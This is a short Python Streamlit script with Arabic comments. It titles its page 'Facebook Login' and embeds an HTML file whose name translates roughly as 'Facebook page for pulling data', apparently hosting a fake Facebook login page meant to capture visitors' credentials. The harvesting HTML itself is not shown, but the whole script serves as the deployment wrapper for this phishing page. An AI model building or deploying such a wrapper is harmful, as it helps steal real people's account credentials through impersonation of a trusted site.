import streamlit as st
import streamlit.components.v1 as components

# إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# محاولة قراءة محتوى الملف
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        my_html_code = f.read()
    
    # التصحيح: نمرر my_html_code مباشرة كأول قيمة بدون كلمة html_content
    components.html(my_html_code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ الملف غير موجود! تأكد أن اسم ملف الـ HTML في GitHub هو 'صفحه فيس لسحب البيانات.html' بالضبط.")
